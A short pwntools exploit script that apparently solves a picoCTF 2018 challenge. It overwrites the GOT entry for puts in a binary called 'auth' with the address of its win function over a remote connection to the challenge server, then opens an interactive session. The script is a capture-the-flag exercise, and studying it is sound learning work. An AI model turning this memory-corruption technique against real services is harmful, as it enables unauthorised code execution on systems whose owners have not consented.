from pwn import *

auth = ELF('./auth')
win_addr = hex(auth.symbols['win'])
target   = hex(auth.got['puts'])

r = remote('2018shell3.picoctf.com', 23731)
r.sendline(target)
r.sendline(win_addr)

r.interactive()
